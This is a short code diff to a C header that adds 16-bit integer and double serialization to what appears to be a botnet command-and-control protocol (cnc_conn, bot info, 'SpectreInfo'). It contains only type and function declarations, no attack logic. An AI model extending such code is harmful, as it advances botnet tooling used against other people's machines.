@@ -23,14 +23,16 @@ typedef enum {
 
 typedef enum {
     ArgTypeUnknown = -1,
+    ArgTypeInt16,
     ArgTypeInt32,
+    ArgTypeInt64,
     ArgTypeString,
     ArgTypeBool,
     ArgTypeBinary,
     ArgTypeStringList,
     ArgTypeStringMap,
     ArgTypeFloat,
-    ArgTypeInt64,
+    ArgTypeDouble,
     ArgTypeBotInfo,
     ArgTypeIP,
     ArgTypeURL,
@@ -72,6 +74,10 @@ void free_packet(Packet *packet);
 
 Packet *create_packet(int type);
 
+bool write_int16(cnc_conn *c, int16_t val);
+
+bool read_int16(cnc_conn *c, int16_t *val);
+
 bool write_int32(cnc_conn *c, int32_t val);
 
 bool read_int32(cnc_conn *c, int32_t *val);
@@ -84,9 +90,11 @@ bool write_string(cnc_conn *c, char *val);
 
 bool read_string(cnc_conn *c, char **str);
 
-bool write_bool(cnc_conn *c, bool val);
-
 bool write_float(cnc_conn *c, float val);
+
+bool write_double(cnc_conn *conn, double val);
+
+bool write_bool(cnc_conn *c, bool val);
 
 StringList *read_string_list(cnc_conn *c);
 
@@ -96,9 +104,9 @@ bool write_bot_info(cnc_conn *conn, SpectreInfo *info);
 
 bool read_float(cnc_conn *c, float *val);
 
-bool read_bool(cnc_conn *c, bool *val);
+bool read_double(cnc_conn *c, double *val);
 
-bool write_double(cnc_conn *conn, double val);
+bool read_bool(cnc_conn *c, bool *val);
 
 bool read_binary(cnc_conn *c, BYTES **buf);
 
